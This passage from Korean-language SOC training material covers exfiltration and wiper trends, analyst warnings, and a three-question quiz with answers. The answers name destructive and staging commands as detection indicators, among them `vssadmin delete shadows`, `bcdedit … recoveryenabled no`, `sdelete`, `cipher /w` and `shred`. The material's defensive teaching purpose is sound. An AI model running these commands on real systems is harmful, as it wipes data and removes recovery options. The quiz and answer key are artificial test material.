    - **유출이 믿을 만한 서비스를 타고 나간다.** 클라우드 저장소 API와 동기화 도구(rclone 등), SaaS 파일 공유, 훔친 토큰으로 SaaS 테넌트에서 직접 빼 가기가 흔해졌습니다. 상당 부분은 우리 프록시를 거치지도 않으니 클라우드·SaaS 감사 로그(그리고 CASB)도 필요합니다.
    - **DNS가 덜 보인다.** DNS over HTTPS와 암호화 DNS는 클라이언트가 우리 리졸버를 쓰도록 강제하지 않으면 고전적인 DNS 로그에서 터널링을 감출 수 있습니다([암호화 DNS](../dns/encrypted-dns.md)).
    - **관리 화면을 통한 파괴.** 최근 와이퍼도 여전히 원시 디스크 접근과 취약한 서명 드라이버(BYOVD)를 쓰지만, 2025–26년 보고서들은 공격자가 정상적인 기기 관리·클라우드 콘솔을 악용해 기기를 대량으로 초기화·삭제하는 사례도 설명합니다. 이 경우 흔적은 엔드포인트 프로세스 이벤트가 아니라 그 콘솔의 감사 로그에 남습니다. MDM, 백업, 가상화 콘솔의 관리자 접근을 파괴 경로로 다루세요.
    - **중요도가 도구에 들어왔다.** XDR과 노출 관리(exposure management) 플랫폼에서 중요 자산·아이덴티티를 표시하고 인시던트 우선순위에 반영할 수 있고, 아이덴티티 플랫폼은 특권 역할 구성원을 바로 보여 줍니다. 원리는 같습니다. 목록이 맞아야 합니다.
    - **ATT&CK v19/v20.** 여기서 쓴 전술(Collection, Exfiltration TA0010, Impact TA0040)과 기법(T1560.001, T1567.002, T1048, T1041, T1485, T1490, T1561, T1484.001, T1072)은 ID가 그대로입니다. v19(2026년 4월)부터 방어 회피 기법은 Stealth(TA0005)와 Defense Impairment(TA0112)로 나뉘었습니다.

!!! warning "[주의] 옛 방식대로 하면 틀리거나 위험한 점"
    - **"잘 쓰였고 개인 맞춤"은 더 이상 표적의 증거가 아니다.** 2025–26년 업계 보고서들은 AI가 쓴 피싱이 이제 기본값이라고 말합니다. 유창하고 맞춤인 미끼를 대량으로 싸게 만들 수 있습니다. 글솜씨보다 *내부 사정*(내부 이름, 실제 절차, 실제 일정)과 *하나뿐인 인프라*에 훨씬 큰 무게를 두세요.
    - **"OSINT에 없음"도 증거는 아니다.** 아무나 노리는 새 인프라도 처음 몇 시간은 아무 데도 없습니다. 드묾은 다른 신호와 함께 봅니다.
    - **표적일 수 있는 URL이나 파일을 드문지 보려고 공개 스캐너에 올리지 마세요.** 공격자가 지켜보고 있을 수 있고, 데이터가 샐 수도 있습니다. 이미 있는 결과를 먼저 검색하고, 비공개 분석을 씁니다([분석 OPSEC](../http-analysis/evil-http-and-reputation.md)).
    - **암호화된 트래픽이 모든 걸 숨긴다고 생각하지 마세요.** `conn.log`의 방향, 양, 길이, 목적지는 여전히 대량 유출을 드러냅니다.
    - **백업·배포 서버를 "IT 배관" 정도로 여기지 마세요.** 최고의 파괴 경로이고, 중요 자산 목록에 들어가야 합니다.

## 확인 문제 { #quiz }

### 문제 1

UEBA 경보에 따르면 `svc_reports`가 밤새 HR 공유 폴더에서 평소의 30배를 읽었습니다. 같은 시간 EDR에는 같은 서버에서 `7z.exe a -p -v100m`이 보이고, 방화벽에는 그 서버에서 여러 다른 포트로 나가다 차단된 연결 12개, 그다음 443으로 허용된 연결 하나가 있습니다. 무슨 일이 벌어지고 있고, 유출의 어떤 단계들이 보이며, 다음에 무엇을 확인하나요?

??? success "정답과 해설"
    **데이터 수집, 준비, 유출이 진행 중**일 가능성이 아주 큽니다. 거의 끝난 상황이니 대기열 맨 위로 갑니다.

    - UEBA의 양 급증 = 데이터 **접근**(그리고 아마 **모아 두기**).
    - `7z a -p -v100m` = **준비**: 비밀번호로 잠금(DLP에서 내용 숨김), 100MB 조각으로 분할. T1560.001.
    - 여러 포트 차단 뒤 443 허용 = **나갈 길 찾기**(출구 탐색)와 찾아낸 길.

    다음: `conn.log`/프록시에서 허용된 443 연결의 **길이, `orig_bytes` 대 `resp_bytes`**, 목적지(TLS 서버 이름, 평판, 클라우드 저장소인가?)를 봅니다. 압축 조각이 어디 있고 아직 남아 있는지 확인합니다. `svc_reports`가 어떻게 로그온했는지(4624/4672, 어디서) 확인합니다. 절차에 따라 격리합니다.

### 문제 2

파괴 공격의 조기 경보 신호 네 가지와, 각각을 보여 줄 로그 출처나 이벤트를 쓰세요.

??? success "정답과 해설"
    다음 중 넷:

    - **침해된 패치·배포 서버**(T1072) — 그 서버의 이상한 로그온(4624/4672), 배포 도구 로그의 새 패키지나 작업.
    - **침해된 높은 권한 계정** — 낯선 호스트에서 관리자 계정의 4624/4672, 이상한 시간의 4768/4769 Kerberos 활동.
    - **모르는 GPO 변경**(T1484.001) — 도메인 컨트롤러의 **5136**, 개체 클래스 `groupPolicyContainer`.
    - **완전 삭제 도구** — `sdelete`, `cipher /w`가 찍힌 **4688**/Sysmon 1, Linux에서는 `shred`, `wipe`, `srm`에 대한 auditd/EDR 기록(T1485).
    - **원시 디스크 드라이버** — 예상 못 한 서명 드라이버의 **7045**(커널 모드 드라이버 서비스 설치)와 **Sysmon 6**(드라이버 로드)(T1561).
    - **알려진 와이퍼·랜섬웨어 계열** — 백신·EDR 탐지 이름, 웜처럼 퍼지는 행동 경보.
    - **복구 수단 제거** — `vssadmin delete shadows`, `bcdedit … recoveryenabled no`(T1490).

### 문제 3

경보 내용이 "WS-2231에서 악성 LNK 실행, 사용자 k.sato"뿐입니다. 중요한지 아닌지 아무 말이 없습니다. 무엇부터 조회하고, 어떤 결과가 나오면 표적 공격을 의심하나요?

??? success "정답과 해설"
    먼저 **사용자**(직함, 부서, 특권 그룹, `adminCount`), **호스트**(이름 규칙, 자산 목록의 중요도, 담당자), 그리고 있다면 그 사용자가 닿을 수 있는 **데이터**를 조회합니다. "수석 엔지니어", 임원, 돈을 옮길 수 있는 재무 직원, 모든 워크스테이션에 관리자 권한이 있는 헬프데스크 계정이라면 우선순위가 올라갑니다.

    확인할 표적 공격 신호: LNK 해시의 **보급도**(전 세계에서 한 번?), 업체가 고급 계열로 이름을 붙였는지, 문자열이나 페이로드 설정에 **우리 회사나 호스트 이름**이 있는지, 어떻게 왔는지(**내부 사정을 아는** 맞춤 메일이 이 한 사람에게만?), 접속하는 도메인이 **어떤 공개 자료에도 없거나** 우리 도메인의 **닮은꼴**인지, 이어지는 행동이 사람 손으로 하는 것(원격 접속 도구, 빠른 옆 이동)인지.
